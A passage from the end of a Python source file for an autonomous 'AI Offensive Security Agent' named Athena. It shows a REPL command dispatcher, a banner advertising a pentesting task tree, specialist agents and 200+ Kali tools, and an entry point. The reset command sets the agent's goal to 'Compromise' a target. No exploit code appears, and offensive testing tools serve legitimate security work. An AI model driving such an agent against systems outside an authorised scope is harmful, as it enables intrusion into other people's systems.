                self.show_findings()
            elif cmd == "tree":
                self.show_tree()
            elif cmd == "tools":
                self.show_tools_status()
            elif cmd == "model":
                self.show_model_status()
            elif cmd == "agent" or cmd == "agents":
                self.show_agents()
            elif cmd == "save":
                self.save_session()
            elif cmd == "report":
                self._generate_report()
            elif cmd == "clear":
                self.history.clear()
                self.command_history.clear()
                self.current_workflow_key = None
                print("\033[90m   AI memory cleared.  PTT and findings preserved.\033[0m")
            elif cmd == "reset":
                self.history.clear()
                self.command_history.clear()
                self.current_workflow_key = None
                goal = "Compromise " + (self.target_info.get("ip") or
                                         self.target_info.get("domain") or "target")
                self.ptt = PTT(goal=goal)
                self.stuck_counter = 0
                print("\033[90m   Full reset.  Fresh PTT, no findings, "
                      "no history.\033[0m")
            else:
                self._agent_loop(user_input, workflow_key=None)


# ═════════════════════════════════════════════════════════════════════
# BANNER
# ═════════════════════════════════════════════════════════════════════

BANNER = r"""
[35m
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║     █████╗ ████████╗██╗  ██╗███████╗███╗   ██╗ █████╗            ║
    ║    ██╔══██╗╚══██╔══╝██║  ██║██╔════╝████╗  ██║██╔══██╗           ║
    ║    ███████║   ██║   ███████║█████╗  ██╔██╗ ██║███████║           ║
    ║    ██╔══██║   ██║   ██╔══██║██╔══╝  ██║╚██╗██║██╔══██║           ║
    ║    ██║  ██║   ██║   ██║  ██║███████╗██║ ╚████║██║  ██║           ║
    ║    ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝           ║
    ║                                                                  ║
    ║                  AI Offensive Security Agent v7.0                ║
    ║                                                                  ║
    ║    [90mPentesting Task Tree · Specialist Agents · Source-Tagged[35m   ║
    ║       [90mGroq Provider Chain · 200+ Kali Tools · No Persistence[35m    ║
    ║                                                                  ║
    ║                  [97mCommander: The Priest[35m                          ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
[0m"""


# ═════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    try:
        session = AthenaSession()
        session.repl()
    except KeyboardInterrupt:
        print("\n\033[90mInterrupted.\033[0m")
        sys.exit(130)
